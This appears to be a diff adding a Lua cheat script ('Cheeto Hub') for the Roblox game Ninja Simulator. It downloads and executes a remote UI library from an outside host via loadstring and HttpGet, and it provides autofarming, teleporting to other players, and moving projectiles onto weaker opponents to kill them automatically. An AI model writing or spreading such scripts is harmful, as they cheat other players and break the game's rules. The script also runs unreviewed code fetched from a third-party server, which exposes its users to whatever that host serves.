@@ -1,0 +1,157 @@
+
+local plrs = {}
+for i,v in pairs(game.Players:GetPlayers()) do
+    if v ~= game.Players.LocalPlayer then
+        table.insert(plrs,tostring(v))
+    end
+end
+
+local upgrades = {}
+
+
+
+
+local library = loadstring(game:HttpGet("http://cindering.xyz/message.txt"))()
+
+local Window = library:AddWindow("Cheeto Hub | OP Ninja Sim")
+
+local tab1 = Window:AddTab("Main")
+
+local tab2 = Window:AddTab("Players")
+
+
+
+function tool()
+
+    for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+
+        if v.Name ~= "Shuriken"  then
+            if v.Name ~= "TeleportTool" then
+          local tools = v
+
+          return tools
+            end
+        end
+    end
+end
+
+
+
+
+
+
+
+
+
+
+tab1:AddSwitch("Autofarm",function(value)
+    tog = value
+    
+    local character = game.Players.LocalPlayer.Character
+
+
+
+
+
+
+
+for i,v in pairs(character:GetChildren()) do
+
+
+
+if v:IsA("Tool") then
+    equipped = true
+    else
+  equipped = false
+    end
+end
+
+    local tool = tool()
+    if equipped ~= true then
+game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
+end
+
+
+    while tog do wait()
+local vu = game:GetService("VirtualUser")
+vu:Button1Down(Vector2.new())
+        end
+    end)
+
+
+tab1:AddSwitch("Auto Equip Katana",function(value)
+    tog2 = value
+    while tog2 do wait()
+        local tool = tool()
+        game.Players.LocalPlayer.Character.Humanoid:EquipTool(tool)
+    end
+end)
+
+
+
+
+
+
+
+
+
+local drop = tab2:AddDropdown("Select Player to Kill",function(selected)
+    select = selected
+end)
+
+for i = 1,#plrs do
+    if  game:GetService("Players")[plrs[i]].leaderstats.Power.Value <= game:GetService("Players").LocalPlayer.leaderstats.Power.Value and game:GetService("Players")[plrs[i]].Team ~= game:GetService("Players").LocalPlayer.Team then
+  drop:Add(plrs[i])  
+    end
+end
+
+
+
+tab2:AddSwitch("Toggle Player to Kill",function(value)
+    tog = value
+    while tog do wait()
+        if select then
+        game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Shuriken"))
+        for i,v in pairs(game:GetService("Workspace").Bullets:GetChildren()) do
+            
+            v.CFrame = CFrame.new(game:GetService("Players")[select].Character.HumanoidRootPart.Position)
+            end
+        end
+    end
+end)
+
+
+tab2:AddLabel("Only shows the list of people weaker than you.")
+tab2:AddLabel("Just click when the shuriken is equipped and it will")
+tab2:AddLabel("teleport the shuriken into the player.")
+
+
+
+local dropd = tab2:AddDropdown("Tp to Player",function(selected)
+    select = selected
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[select].Character.HumanoidRootPart.Position)
+end)
+
+
+for i = 1,#plrs do
+    if  game:GetService("Players")[plrs[i]].leaderstats.Power.Value <= game:GetService("Players").LocalPlayer.leaderstats.Power.Value and game:GetService("Players")[plrs[i]].Team ~= game:GetService("Players").LocalPlayer.Team then
+  dropd:Add(plrs[i])  
+    end
+end
+
+
+tab2:AddSwitch("Kill all Weaker Players",function(value)
+    switch = value
+    while switch do 
+        for i = 1,#plrs do
+        if game:GetService("Players")[plrs[i]].leaderstats.Power.Value <= game:GetService("Players").LocalPlayer.leaderstats.Power.Value and game:GetService("Players")[plrs[i]].Team ~= game:GetService("Players").LocalPlayer.Team then
+            for k,v in pairs(game:GetService("Workspace").Bullets:GetChildren()) do
+                v.CFrame = CFrame.new(game:GetService("Players")[plrs[i]].Character.HumanoidRootPart.Position)
+                game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Shuriken"))
+                wait()
+                end
+            end
+        end
+    end
+end)
+
